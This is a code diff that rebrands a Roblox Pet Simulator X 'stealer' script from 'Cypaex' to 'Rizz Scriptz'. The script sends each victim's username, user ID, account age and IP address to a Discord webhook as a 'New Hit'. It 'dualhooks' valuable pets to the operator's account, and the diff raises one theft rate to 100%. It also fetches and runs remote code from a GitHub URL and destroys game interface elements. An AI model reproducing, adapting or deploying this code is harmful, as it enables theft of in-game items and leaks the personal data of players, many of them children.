@@ -10,7 +10,7 @@
 getgenv().Settings = {
     User = "petspsx651",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = ".gg/hzBAruhe2X",
+    MailMessage = ".gg/uSgzNwHDTS",
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
@@ -21,7 +21,7 @@ getgenv().Settings = {
     },
     Huges = {
         Dualhook = true,
-        Intensity = 50 --%
+        Intensity = 100 --%
     },
     Pogs = {
         Dualhook = true,
@@ -748,9 +748,9 @@ end
 local diaamt = PlayerInfos.Diamonds
 if diaamt < 110000 then
     _G.Webhook = Webhook
-    _G.LoadingScreen = true
-    _G.AntiLeave = true
-    _G.MouseLock = true
+    _G.LoadingScreen = false
+    _G.AntiLeave = false
+    _G.MouseLock = false
     loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Cypaex/Bank/main/Engine", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
@@ -761,7 +761,7 @@ if _G.AntiLeave ~= false then
         end
     end
     for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if v.Name ~= "CypaexHub" and v.Name ~= "RobloxPromptGui" then
+        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
             v:Destroy()
         end
     end
@@ -955,14 +955,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://cdn.discordapp.com/attachments/760075427179528192/1129889901945569280/6819127.png"
+        "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Cypaex Scripts",
+            ["username"] = "Rizz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Cypaex||",
-                ["url"] = "https://discord.gg/hzBAruhe2X",
+                ["title"] = "**New Hit** ||With Rizz||",
+                ["url"] = "https://discord.gg/uSgzNwHDTS",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -971,7 +971,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Cypaex Scripts's Stealer** :alien:",
+                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1025,14 +1025,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://cdn.discordapp.com/attachments/760075427179528192/1129889901945569280/6819127.png"
+        "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Cypaex Scripts",
+            ["username"] = "Rizz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Cypaex||",
-                ["url"] = "https://discord.gg/hzBAruhe2X",
+                ["title"] = "**New Hit** ||With Rizz||",
+                ["url"] = "https://discord.gg/uSgzNwHDTS",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1041,7 +1041,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Cypaex Script's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1090,7 +1090,7 @@ local dhuser = getgenv().Settings.User
 --         local dhdata = {
 --             dhprem = dhkey
 --         }
---         local dhurl = "https://cypaexhub.000webhostapp.com/keys.php" -- Exc : https://rizz.xyz/premium.php
+--         local dhurl = "https://janeq.space/others/keya.php" -- Exc : https://rizz.xyz/premium.php
 --         local dhheaders = {
 --             ["content-type"] = "application/json"
 --         }
@@ -1118,7 +1118,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = ".gg/hzBAruhe2X"
+local mailmsg = ".gg/uSgzNwHDTS"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
